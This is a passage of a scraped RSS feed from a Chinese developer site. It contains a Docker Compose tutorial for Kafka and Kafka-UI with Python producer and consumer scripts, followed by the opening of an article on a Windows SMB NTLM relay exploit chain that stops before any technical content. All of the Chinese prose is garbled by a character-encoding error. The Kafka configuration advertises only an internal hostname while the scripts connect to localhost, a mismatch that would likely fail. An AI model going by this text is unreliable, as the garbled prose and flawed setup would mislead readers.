ç¬‘å¯¹æµå¹´ä¸‡å¤æƒ…ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Docker Composeä¸€é”®éƒ¨ç½²Kafkaä¸Kafka-UIå¯è§†åŒ–ç®¡ç†é¢æ¿]]></title>    <link>https://juejin.cn/post/7592451588848435219</link>    <guid>https://juejin.cn/post/7592451588848435219</guid>    <pubDate>2026-01-08T02:22:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592451588848435219" data-draft-id="7592452108798476331" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Docker Composeä¸€é”®éƒ¨ç½²Kafkaä¸Kafka-UIå¯è§†åŒ–ç®¡ç†é¢æ¿"/> <meta itemprop="keywords" content="Kafka,Docker"/> <meta itemprop="datePublished" content="2026-01-08T02:22:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å†°å—çš„æ—…è¡Œ"/> <meta itemprop="url" content="https://juejin.cn/user/3773179636746007"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Docker Composeä¸€é”®éƒ¨ç½²Kafkaä¸Kafka-UIå¯è§†åŒ–ç®¡ç†é¢æ¿
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3773179636746007/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å†°å—çš„æ—…è¡Œ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:22:37.000Z" title="Thu Jan 08 2026 02:22:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Docker Composeä¸€é”®éƒ¨ç½²Kafkaä¸Kafka-UIå¯è§†åŒ–ç®¡ç†é¢æ¿</h2>
<p>æä¾›ä¸€ä¸ªå®Œæ•´çš„ã€ç»è¿‡éªŒè¯çš„Docker Composeéƒ¨ç½²æ–¹æ¡ˆï¼ŒåŒ…æ‹¬Kafkaé›†ç¾¤å’ŒKafka-UIå¯è§†åŒ–ç®¡ç†é¢æ¿ï¼Œä»¥åŠPython Kafkaç”Ÿäº§æ¶ˆè´¹ç¤ºä¾‹ã€‚</p>
<h3 data-id="heading-1">ä¸€ã€éƒ¨ç½²Kafkaä¸Kafka-UI</h3>
<h4 data-id="heading-2">1. åˆ›å»ºç›®å½•ç»“æ„</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">mkdir</span> -p kafka-compose &amp;&amp; <span class="hljs-built_in">cd</span> kafka-compose
</code></pre>
<h4 data-id="heading-3">2. åˆ›å»ºdocker-compose.ymlæ–‡ä»¶</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">'3.5'</span>
<span class="hljs-attr">services:</span>
  <span class="hljs-attr">zookeeper:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">wurstmeister/zookeeper</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">zookeeper</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"2181:2181"</span>
  
  <span class="hljs-attr">kafka:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">wurstmeister/kafka</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">kafka</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">/etc/localtime:/etc/localtime</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"9092:9092"</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-attr">KAFKA_ZOOKEEPER_CONNECT:</span> <span class="hljs-string">zookeeper:2181</span>
      <span class="hljs-attr">KAFKA_ADVERTISED_LISTENERS:</span> <span class="hljs-string">INSIDE://kafka:9092</span>
      <span class="hljs-attr">KAFKA_LISTENERS:</span> <span class="hljs-string">INSIDE://0.0.0.0:9092</span>
      <span class="hljs-attr">KAFKA_LISTENER_SECURITY_PROTOCOL_MAP:</span> <span class="hljs-string">INSIDE:PLAINTEXT</span>
      <span class="hljs-attr">KAFKA_LISTENER_NAME_SELECTOR:</span> <span class="hljs-string">INSIDE</span>
      <span class="hljs-attr">KAFKA_INTER_BROKER_LISTENER_NAME:</span> <span class="hljs-string">INSIDE</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">zookeeper</span>
  
  <span class="hljs-attr">kafka-ui:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">provectuslabs/kafka-ui</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">kafka-ui</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"8080:8080"</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">kafka</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-attr">DYNAMIC_CONFIG_ENABLED:</span> <span class="hljs-string">'true'</span>
      <span class="hljs-attr">KAFKA_CLUSTERS_0_NAME:</span> <span class="hljs-string">local</span>
      <span class="hljs-attr">KAFKA_CLUSTERS_0_BOOTSTRAP_SERVERS:</span> <span class="hljs-string">kafka:9092</span>
</code></pre>
<h4 data-id="heading-4">3. å¯åŠ¨æœåŠ¡</h4>
<pre><code class="hljs">docker-compose up -d
</code></pre>
<h4 data-id="heading-5">4. éªŒè¯æœåŠ¡çŠ¶æ€</h4>
<pre><code class="hljs">docker-compose ps
</code></pre>
<h4 data-id="heading-6">5. è®¿é—®Kafka-UI</h4>
<p>æ‰“å¼€æµè§ˆå™¨è®¿é—® <code>http://localhost:8080</code>ï¼Œå³å¯çœ‹åˆ°Kafka-UIçš„ç™»å½•ç•Œé¢ã€‚é¦–æ¬¡ç™»å½•æ— éœ€è´¦å·å¯†ç ï¼Œç›´æ¥è¿›å…¥ç³»ç»Ÿã€‚</p>
<h3 data-id="heading-7">äºŒã€Python Kafkaç”Ÿäº§æ¶ˆè´¹ç¤ºä¾‹</h3>
<h4 data-id="heading-8">1. å®‰è£…ä¾èµ–</h4>
<pre><code class="hljs">pip install kafka-python
</code></pre>
<h4 data-id="heading-9">2. ç”Ÿäº§è€…ä»£ç  (producer.py)</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> kafka <span class="hljs-keyword">import</span> KafkaProducer
<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> random
<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime

<span class="hljs-comment"># é…ç½®KafkaæœåŠ¡å™¨åœ°å€</span>
BOOTSTRAP_SERVERS = [<span class="hljs-string">'localhost:9092'</span>]
TOPIC_NAME = <span class="hljs-string">'test_topic'</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">create_producer</span>():
    <span class="hljs-string">"""åˆ›å»ºKafkaç”Ÿäº§è€…"""</span>
    <span class="hljs-keyword">return</span> KafkaProducer(
        bootstrap_servers=BOOTSTRAP_SERVERS,
        value_serializer=<span class="hljs-keyword">lambda</span> v: json.dumps(v).encode(<span class="hljs-string">'utf-8'</span>)
    )

<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_mock_data</span>():
    <span class="hljs-string">"""ç”Ÿæˆæ¨¡æ‹Ÿæ•°æ®"""</span>
    user_ids = [<span class="hljs-string">'user_001'</span>, <span class="hljs-string">'user_002'</span>, <span class="hljs-string">'user_003'</span>, <span class="hljs-string">'user_004'</span>]
    actions = [<span class="hljs-string">'click'</span>, <span class="hljs-string">'view'</span>, <span class="hljs-string">'purchase'</span>, <span class="hljs-string">'logout'</span>, <span class="hljs-string">'login'</span>]
    
    <span class="hljs-keyword">return</span> {
        <span class="hljs-string">"user_id"</span>: random.choice(user_ids),
        <span class="hljs-string">"action"</span>: random.choice(actions),
        <span class="hljs-string">"timestamp"</span>: datetime.now().isoformat(),
        <span class="hljs-string">"value"</span>: random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>)
    }

<span class="hljs-keyword">def</span> <span class="hljs-title function_">produce_data</span>(<span class="hljs-params">producer, topic</span>):
    <span class="hljs-string">"""æŒç»­ç”Ÿäº§æµ‹è¯•æ•°æ®"""</span>
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            <span class="hljs-comment"># ç”Ÿæˆæ•°æ®</span>
            data = generate_mock_data()
            <span class="hljs-comment"># å‘é€æ¶ˆæ¯</span>
            producer.send(topic, value=data)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Produced message: <span class="hljs-subst">{data}</span>"</span>)
            time.sleep(<span class="hljs-number">1</span>)  <span class="hljs-comment"># æ¯ç§’å‘é€ä¸€æ¡</span>
    <span class="hljs-keyword">except</span> KeyboardInterrupt:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"Stopping producer..."</span>)
    <span class="hljs-keyword">finally</span>:
        producer.close()

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    producer = create_producer()
    produce_data(producer, TOPIC_NAME)
</code></pre>
<h4 data-id="heading-10">3. æ¶ˆè´¹è€…ä»£ç  (consumer.py)</h4>
<pre><code class="hljs language-ini" lang="ini">from kafka import KafkaConsumer
import json

<span class="hljs-comment"># åˆ›å»ºæ¶ˆè´¹è€…å®ä¾‹å¹¶é…ç½®å‚æ•°</span>
<span class="hljs-attr">consumer</span> = KafkaConsumer(
    'test_topic',  <span class="hljs-comment"># è®¢é˜…çš„ä¸»é¢˜å</span>
    <span class="hljs-attr">bootstrap_servers</span>=[<span class="hljs-string">'localhost:9092'</span>],  <span class="hljs-comment"># KafkaæœåŠ¡å™¨åœ°å€åˆ—è¡¨</span>
    <span class="hljs-attr">group_id</span>=<span class="hljs-string">'mygroup'</span>,  <span class="hljs-comment"># æ¶ˆè´¹è€…ç»„ID</span>
    <span class="hljs-attr">auto_offset_reset</span>=<span class="hljs-string">'earliest'</span>  <span class="hljs-comment"># å½“æ²¡æœ‰åˆå§‹åç§»é‡æˆ–å½“å‰åç§»é‡æ— æ•ˆæ—¶ï¼Œè‡ªåŠ¨é‡ç½®åç§»é‡åˆ°æœ€æ—©çš„è®°å½•</span>
)

<span class="hljs-comment"># æ¶ˆè´¹æ¶ˆæ¯å¾ªç¯</span>
for message in consumer:
    <span class="hljs-comment"># è§£ææ¶ˆæ¯</span>
    <span class="hljs-attr">data</span> = json.loads(message.value.decode(<span class="hljs-string">'utf-8'</span>))
    print(f"Consumed message: {data}")
</code></pre>
<h3 data-id="heading-11">ä¸‰ã€ä½¿ç”¨æ­¥éª¤</h3>
<ol>
<li>
<p><strong>å¯åŠ¨Kafkaå’ŒKafka-UI</strong>ï¼š</p>
<pre><code class="hljs">docker-compose up -d
</code></pre>
</li>
<li>
<p><strong>è¿è¡Œç”Ÿäº§è€…</strong>ï¼š</p>
<pre><code class="hljs">python producer.py
</code></pre>
</li>
<li>
<p><strong>è¿è¡Œæ¶ˆè´¹è€…</strong>ï¼š</p>
<pre><code class="hljs">python consumer.py
</code></pre>
</li>
<li>
<p><strong>ä½¿ç”¨Kafka-UI</strong>ï¼š</p>
<ul>
<li>è®¿é—® <code>http://localhost:8080</code></li>
<li>åœ¨Kafka-UIç•Œé¢ä¸­ï¼Œæ‚¨å¯ä»¥æŸ¥çœ‹é›†ç¾¤çŠ¶æ€ã€ä¸»é¢˜ã€æ¶ˆè´¹è€…ç»„ç­‰ä¿¡æ¯</li>
</ul>
</li>
</ol>
<h3 data-id="heading-12">å››ã€å¸¸è§é—®é¢˜è§£å†³</h3>
<ol>
<li>
<p><strong>Kafka-UIæ— æ³•è®¿é—®</strong>ï¼š</p>
<ul>
<li>ç¡®è®¤ç«¯å£æ˜ å°„æ˜¯å¦æ­£ç¡®ï¼š<code>- "8080:8080"</code></li>
<li>æ£€æŸ¥å®¹å™¨æ—¥å¿—ï¼š<code>docker logs kafka-ui</code></li>
</ul>
</li>
<li>
<p><strong>Pythonè„šæœ¬è¿æ¥é—®é¢˜</strong>ï¼š</p>
<ul>
<li>ç¡®è®¤KafkaæœåŠ¡å·²å¯åŠ¨ï¼š<code>docker-compose ps</code></li>
<li>ç¡®è®¤ç”Ÿäº§è€…/æ¶ˆè´¹è€…ä»£ç ä¸­çš„<code>bootstrap_servers</code>ä¸å®é™…ç«¯å£ä¸€è‡´ï¼ˆ<code>localhost:9092</code>ï¼‰</li>
</ul>
</li>
<li>
<p><strong>KafkaæœåŠ¡å¯åŠ¨å¤±è´¥</strong>ï¼š</p>
<ul>
<li>æ£€æŸ¥Dockeræ—¥å¿—ï¼š<code>docker logs kafka</code></li>
<li>ç¡®è®¤ZookeeperæœåŠ¡å·²å¯åŠ¨ï¼ˆKafkaä¾èµ–äºZookeeperï¼‰</li>
</ul>
</li>
</ol>
<h3 data-id="heading-13">äº”ã€Kafka-UIåŠŸèƒ½ç®€ä»‹</h3>
<p>Kafka-UIæä¾›äº†ä»¥ä¸‹å®ç”¨åŠŸèƒ½ï¼š</p>
<ul>
<li><strong>é›†ç¾¤ç›‘æ§</strong>ï¼šæŸ¥çœ‹é›†ç¾¤å¥åº·çŠ¶æ€ã€ç‰ˆæœ¬ä¿¡æ¯</li>
<li><strong>ä¸»é¢˜ç®¡ç†</strong>ï¼šåˆ›å»ºã€ä¿®æ”¹ã€åˆ é™¤ä¸»é¢˜</li>
<li><strong>æ¶ˆè´¹è€…ç»„ç®¡ç†</strong>ï¼šæŸ¥çœ‹å’Œç®¡ç†æ¶ˆè´¹è€…ç»„</li>
<li><strong>å®æ—¶æµé‡ç›‘æ§</strong>ï¼šæŸ¥çœ‹ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…çš„æµé‡</li>
<li><strong>ä¸»é¢˜è¯¦æƒ…</strong>ï¼šæŸ¥çœ‹ä¸»é¢˜çš„åˆ†åŒºã€å‰¯æœ¬ç­‰ä¿¡æ¯</li>
</ul>
<p>é€šè¿‡ä»¥ä¸Šæ­¥éª¤ï¼Œå®ŒæˆKafkaçš„éƒ¨ç½²å’Œå¯è§†åŒ–ç®¡ç†é¢æ¿çš„é…ç½®ï¼Œå¹¶å¼€å§‹ä½¿ç”¨Pythonè¿›è¡ŒKafkaæ¶ˆæ¯çš„ç”Ÿäº§å’Œæ¶ˆè´¹ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ­ç§˜CVE-2025-33073ï¼šWindows SMBå®¢æˆ·ç«¯NTLMä¸­ç»§æ”»å‡»ä¸ADIDNSæŠ•æ¯’åˆ©ç”¨é“¾]]></title>    <link>https://juejin.cn/post/7592432859863957538</link>    <guid>https://juejin.cn/post/7592432859863957538</guid>    <pubDate>2026-01-08T01:49:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592432859863957538" data-draft-id="7592432859863924770" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ­ç§˜CVE-2025-33073ï¼šWindows SMBå®¢æˆ·ç«¯NTLMä¸­ç»§æ”»å‡»ä¸ADIDNSæŠ•æ¯’åˆ©ç”¨é“¾"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,AIGC"/> <meta itemprop="datePublished" content="2026-01-08T01:49:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="qife122"/> <meta itemprop="url" content="https://juejin.cn/user/1743174852185579"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ­ç§˜CVE-2025-33073ï¼šWindows SMBå®¢æˆ·ç«¯NTLMä¸­ç»§æ”»å‡»ä¸ADIDNSæŠ•æ¯’åˆ©ç”¨é“¾
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1743174852185579/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    qife122
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T01:49:54.000Z" title="Thu Jan 08 2026 01:49:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">CVE-2025-33073 æ¼æ´åˆ©ç”¨ä¸ADIDNSæŠ•æ¯’æ”»å‡»é“¾</h2>
<h3 data-id="heading-1">é¡¹ç›®æè¿°</h3>
